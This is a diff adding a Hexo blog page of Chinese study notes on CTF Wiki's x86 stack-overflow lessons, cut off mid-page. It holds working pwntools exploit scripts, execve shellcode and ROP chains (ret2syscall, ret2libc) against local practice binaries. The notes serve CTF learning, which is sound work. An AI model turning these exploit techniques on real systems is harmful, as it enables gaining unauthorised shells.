@@ -1,0 +1,716 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/rab.png">
+  <link rel="icon" href="/img/rab.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="FFreestanding">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="函数调用栈先看这个文章学习函数调用栈 基本ROPret2text出栈时RIP指向栈存放函数返回地址的位置，这个地址我们可以改为一个汇编指令的地址，RIP一直往后面指，以那个地址为起点一直往后执行 .text:0804862D                 call    ___isoc99_scanf .text:08048632                 mov     eax, [eb">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTFWiki_PWN_LinuxPlatform_UserMode_Exploitation_StackOverflow_x86">
+<meta property="og:url" content="https://ffreestanding.github.io/posts/e4dc8931.html">
+<meta property="og:site_name" content="FFreestanding">
+<meta property="og:description" content="函数调用栈先看这个文章学习函数调用栈 基本ROPret2text出栈时RIP指向栈存放函数返回地址的位置，这个地址我们可以改为一个汇编指令的地址，RIP一直往后面指，以那个地址为起点一直往后执行 .text:0804862D                 call    ___isoc99_scanf .text:08048632                 mov     eax, [eb">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/323737c129484daead2fd8d63b6a73d5.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/a460183a38204f179fb7810fb3b204f4.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/91578926747c4efbb56304bda9d323b6.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/1769569887a04edebeeb08bc4834fbd0.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/fbf79128e05647d3bce82890363685f3.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/a57ba6f035894f43bbd8c9595bdc1b46.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/a4fe0f22602645f1bce35ebb271d3191.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/84dfb6d63f3f47e0900e00e3cf20fa54.png">
+<meta property="article:published_time" content="2022-06-14T14:05:32.000Z">
+<meta property="article:modified_time" content="2022-07-26T18:37:56.000Z">
+<meta property="article:author" content="FFreestanding">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/323737c129484daead2fd8d63b6a73d5.png">
+  
+  
+  
+  <title>CTFWiki_PWN_LinuxPlatform_UserMode_Exploitation_StackOverflow_x86 - FFreestanding</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"ffreestanding.github.io","root":"/","version":"1.9.1","typing":{"enable":false,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 60vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>HAVE FUN !!!</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/222.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle">CTFWiki_PWN_LinuxPlatform_UserMode_Exploitation_StackOverflow_x86</span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-06-14 22:05" pubdate>
+          2022年6月14日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          4.7k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          40 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">CTFWiki_PWN_LinuxPlatform_UserMode_Exploitation_StackOverflow_x86</h1>
+            
+            <div class="markdown-body">
+              
+              <h2 id="函数调用栈"><a href="#函数调用栈" class="headerlink" title="函数调用栈"></a>函数调用栈</h2><p>先看<a target="_blank" rel="noopener" href="https://www.cnblogs.com/clover-toeic/p/3755401.html">这个文章</a>学习函数调用栈</p>
+<h2 id="基本ROP"><a href="#基本ROP" class="headerlink" title="基本ROP"></a>基本ROP</h2><h3 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h3><p>出栈时RIP指向栈存放函数返回地址的位置，这个地址我们可以改为一个汇编指令的地址，RIP一直往后面指，以那个地址为起点一直往后执行</p>
+<pre><code class="hljs">.text:0804862D                 call    ___isoc99_scanf
+.text:08048632                 mov     eax, [ebp+input]
+.text:08048635                 cmp     eax, [ebp+secretcode]
+.text:08048638                 jnz     short locret_8048646
+.text:0804863A                 mov     dword ptr [esp], offset command ; &quot;/bin/sh&quot;
+.text:08048641                 call    _system
+</code></pre>
+<p>把函数返回地址设为0804863A，会一直往后执行</p>
+<pre><code class="hljs">.text:0804863A                 mov     dword ptr [esp], offset command ; &quot;/bin/sh&quot;
+.text:08048641                 call    _system
+</code></pre>
+<h3 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h3><p>把恶意汇编代码写到数组（代码块）里面，返回地址指向这个数组（代码块）首地址。<br>这个数组要可读写执行，全局变量（**.bss**）有这个特点<br><strong>ljust()</strong> 用法</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;this is string example....wow!!!&quot;</span>;<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">str</span>.ljust(<span class="hljs-number">50</span>, <span class="hljs-string">&#x27;0&#x27;</span>);<br><span class="hljs-comment">#ljust()返回一个原字符串左对齐,并使用空格填充至指定长度的新字符串。</span><br><span class="hljs-comment">#如果指定的长度小于原字符串的长度则返回原字符串。</span><br><span class="hljs-comment">#输出 this is string example....wow!!!000000000000000000</span><br></code></pre></td></tr></table></figure>
+<p><strong>shellcraft.sh()</strong> 打印结果</p>
+<pre><code class="hljs">    /* execve(path=&#39;/bin///sh&#39;, argv=[&#39;sh&#39;], envp=0) */
+    /* push b&#39;/bin///sh\x00&#39; */
+    push 0x68
+    push 0x732f2f2f
+    push 0x6e69622f
+    mov ebx, esp
+    /* push argument array [&#39;sh\x00&#39;] */
+    /* push &#39;sh\x00\x00&#39; */
+    push 0x1010101
+    xor dword ptr [esp], 0x1016972
+    xor ecx, ecx
+    push ecx /* null terminate */
+    push 4
+    pop ecx
+    add ecx, esp
+    push ecx /* &#39;sh\x00&#39; */
+    mov ecx, esp
+    xor edx, edx
+    /* call execve() */
+    push SYS_execve /* 0xb */
+    pop eax
+    int 0x80
+</code></pre>
+<p><strong>计算偏移</strong></p>
+<p><strong>disass main</strong></p>
+<p>反汇编 main 函数找到 main 的第一条指针所在的地址</p>
+<p><img src="https://img-blog.csdnimg.cn/323737c129484daead2fd8d63b6a73d5.png" srcset="/img/loading.gif" lazyload></p>
+<p>在get函数下面的语句打断点</p>
+<p><img src="https://img-blog.csdnimg.cn/a460183a38204f179fb7810fb3b204f4.png" srcset="/img/loading.gif" lazyload></p>
+<pre><code class="hljs">0xffffd038 - 0xffffcfcc + 0x4 = 112
+</code></pre>
+<p><strong>exp.py</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&#x27;./ret2shellcode&#x27;</span>)<br>shellcode = asm(shellcraft.sh())<br><span class="hljs-comment">#asm()得到汇编码的机器代码</span><br><span class="hljs-comment">#shellcraft.sh()生成汇编代码shellcode</span><br>buf2_addr = <span class="hljs-number">0x804a080</span><br><br>sh.sendline(shellcode.ljust(<span class="hljs-number">112</span>, <span class="hljs-string">b&#x27;A&#x27;</span>) + p32(buf2_addr))<br><br>sh.interactive()<br></code></pre></td></tr></table></figure>
+<p>不知道为什么会报错，后来看了一下，发现要写入shellcode的全局数组在不可执行段</p>
+<p><img src="https://img-blog.csdnimg.cn/91578926747c4efbb56304bda9d323b6.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://img-blog.csdnimg.cn/1769569887a04edebeeb08bc4834fbd0.png" srcset="/img/loading.gif" lazyload></p>
+<p>这个方法应该是行不通了</p>
+<h3 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h3><p>利用系统调用<br>该程序是 32 位，所以我们需要使得</p>
+<pre><code class="hljs">系统调用号，即 eax 应该为 0xb
+第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。
+第二个参数，即 ecx 应该为 0
+第三个参数，即 edx 应该为 0
+</code></pre>
+<p>设置寄存器的值，我们需要指令<strong>pop eax</strong>并且还要<strong>ret</strong>回栈继续下一个<strong>pop</strong><br>使用命令查找</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ROPgadget --binary xxx  --only <span class="hljs-string">&#x27;pop|ret&#x27;</span> | grep <span class="hljs-string">&#x27;eax&#x27;</span><br></code></pre></td></tr></table></figure>
+<p>发现一个地址可以一次给三个寄存器赋值</p>
+<p><img src="https://img-blog.csdnimg.cn/fbf79128e05647d3bce82890363685f3.png" srcset="/img/loading.gif" lazyload></p>
+<p>查找’&#x2F;bin&#x2F;sh’字符串</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ROPgadget --binary xxx  --string <span class="hljs-string">&#x27;/bin/sh&#x27;</span> <br></code></pre></td></tr></table></figure>
+<p>查找int 0x80</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ROPgadget --binary xxx  --only <span class="hljs-string">&#x27;int&#x27;</span><br></code></pre></td></tr></table></figure>
+<p>按照前面教程找偏移，用命令n一步步执行</p>
+<p>​	<img src="https://img-blog.csdnimg.cn/a57ba6f035894f43bbd8c9595bdc1b46.png" srcset="/img/loading.gif" lazyload></p>
+<pre><code class="hljs">0x98 - 0x2c + 0x4 = 112
+</code></pre>
+<p><strong>exp.py</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&#x27;./rop&#x27;</span>)<br><br>pop_eax_ret = <span class="hljs-number">0x080bb196</span><br>pop_edx_ecx_ebx_ret = <span class="hljs-number">0x0806eb90</span><br>int_0x80 = <span class="hljs-number">0x08049421</span><br>binsh = <span class="hljs-number">0x80be408</span><br>payload = flat([<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">112</span>, pop_eax_ret, <span class="hljs-number">0xb</span>, pop_edx_ecx_ebx_ret, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, binsh, int_0x80])<br>sh.sendline(payload)<br>sh.interactive()<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>r = process(<span class="hljs-string">&quot;./rop&quot;</span>)<br><br>pop_eax_ret_addr = <span class="hljs-number">0x080bb196</span><br>pop_edx_pop_ecx_pop_ebx_ret_addr = <span class="hljs-number">0x0806eb90</span><br>bin_addr = <span class="hljs-number">0x080be408</span><br>int_0x80_addr = <span class="hljs-number">0x08049421</span><br><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">112</span> + p32(pop_eax_ret_addr) + p32(<span class="hljs-number">0xb</span>) + p32(pop_edx_pop_ecx_pop_ebx_ret_addr) + p32(<span class="hljs-number">0</span>) + p32(<span class="hljs-number">0</span>) + p32(bin_addr) + p32(int_0x80_addr)<br><br>r.sendline(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure>
+
+<h3 id="ret2libc1"><a href="#ret2libc1" class="headerlink" title="ret2libc1"></a>ret2libc1</h3><p>命令查找字符串<code>&#39;/bin/sh&#39;</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ROPgadget --binary ret2libc1 --string <span class="hljs-string">&#x27;/bin/sh&#x27;</span><br></code></pre></td></tr></table></figure>
+<p>在IDA里面查找.plt里面有没有system函数<br>如果是正常调用 system 函数，我们调用的时候会有一个对应的返回地址<br>因为之前ret2text、ret2shellcode是调用代码块，ret2syscall是进行系统调用，都不是正常的函数，调用ret2libc是正常的函数调用，所以根据函数调用栈的约定，要写返回地址，它在比参数地址小4（32位）的位置</p>
+<h3 id="ret2libc2"><a href="#ret2libc2" class="headerlink" title="ret2libc2"></a>ret2libc2</h3><p>没有<code>&#39;/bin/sh&#39;</code>，发现可以用plt中的gets()写入全局数组然后读取</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&#x27;./ret2libc2&#x27;</span>)<br>gets_plt = <span class="hljs-number">0x08048460</span><br>system_plt = <span class="hljs-number">0x08048490</span><br>pop_ebx_ret = <span class="hljs-number">0x0804843d</span><br>buf2 = <span class="hljs-number">0x0804A080</span><br>payload = flat([<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">112</span>, gets_plt, pop_ebx_ret, buf2, system_plt, <span class="hljs-string">&#x27;aaaa&#x27;</span>, buf2])<br>sh.sendline(payload)<br>sh.sendline(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>)<br>sh.interactive()<br></code></pre></td></tr></table></figure>
+<p>gets_plt是gets()地址，pop_ebx_ret是返回地址，函数调用完后到pop_ebx_ret执行命令</p>
+<pre><code class="hljs">0x0804843d : pop ebx ; ret
+</code></pre>
+<p>这里的地址把pop_ebx_ret弹出来，又ret让ip指向栈，进行指到system_plt，调用system()</p>
+<h3 id="ret2libc3"><a href="#ret2libc3" class="headerlink" title="ret2libc3"></a>ret2libc3</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41202237/article/details/105913563">如hollk大佬所说</a></p>
+<blockquote>
+<p>第二个payload用104个字节填满栈空间是因为第二次调用main函数的时候可能缺少了栈初始化的过程，第二次调用的时候并不是从一开始的OPE进入的，所以出现了少8位的情况，可以使用动态调试器修改内存地址进行调试计算</p>
+</blockquote>
+<p>如果LibcSearcher报错：no matched libc，please add more libc or try others<br>要更新一下libc-database<br>具体<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_40889704/article/details/116571781">看这篇文章</a><br>exp.py用Wiki里面的，<strong>用python2运行</strong><br>第一次溢出用puts函数打印__libc_start_main在got中位置，用u32()转换为数字，[0:4]是为了去掉框出的前面的字符串</p>
+<p><img src="https://img-blog.csdnimg.cn/a4fe0f22602645f1bce35ebb271d3191.png" srcset="/img/loading.gif" lazyload></p>
+<p>把地址保存在libc_start_main_addr变量里面，找libc版本，其他略</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> LibcSearcher<br>sh = process(<span class="hljs-string">&#x27;./ret2libc3&#x27;</span>)<br><br>ret2libc3 = ELF(<span class="hljs-string">&#x27;./ret2libc3&#x27;</span>)<br><br>puts_plt = ret2libc3.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>libc_start_main_got = ret2libc3.got[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>main = ret2libc3.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br><br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;leak libc_start_main_got addr and return to main again&quot;</span><br>payload = flat([<span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">112</span>, puts_plt, main, libc_start_main_got])<br>sh.sendlineafter(<span class="hljs-string">&#x27;Can you find it !?&#x27;</span>, payload)<br><br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;get the related addr&quot;</span><br>libc_start_main_addr = u32(sh.recv()[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>])<br>libc = LibcSearcher(<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>, libc_start_main_addr)<br>libcbase = libc_start_main_addr - libc.dump(<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>)<br>system_addr = libcbase + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>binsh_addr = libcbase + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;get shell&quot;</span><br>payload = flat([<span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">104</span>, system_addr, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">4</span>, binsh_addr])<br>sh.sendline(payload)<br><br>sh.interactive()<br></code></pre></td></tr></table></figure>
+
+<p>运行后让我们从0、1中选一个，我选0，然后可以执行命令了</p>
+<p><img src="https://img-blog.csdnimg.cn/84dfb6d63f3f47e0900e00e3cf20fa54.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="中级-ROP"><a href="#中级-ROP" class="headerlink" title="中级 ROP"></a>中级 ROP</h2><h3 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h3>
+              
+            </div>
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/ctfwiki-pwn/" class="category-chain-item">CTFwiki_PWN</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/posts/1de4270e.html" title="ucore概述">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">ucore概述</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/posts/3667977.html" title="Scapy6">
+                        <span class="hidden-mobile">Scapy6</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script>
+  (function() {
+    var enableLang = CONFIG.code_language.enable && CONFIG.code_language.default;
+    var enableCopy = CONFIG.copy_btn;
+    if (!enableLang && !enableCopy) {
+      return;
+    }
+
+    function getBgClass(ele) {
+      return Fluid.utils.getBackgroundLightness(ele) >= 0 ? 'code-widget-light' : 'code-widget-dark';
+    }
+
+    var copyTmpl = '';
+    copyTmpl += '<div class="code-widget">';
+    copyTmpl += 'LANG';
+    copyTmpl += '</div>';
+    jQuery('.markdown-body pre').each(function() {
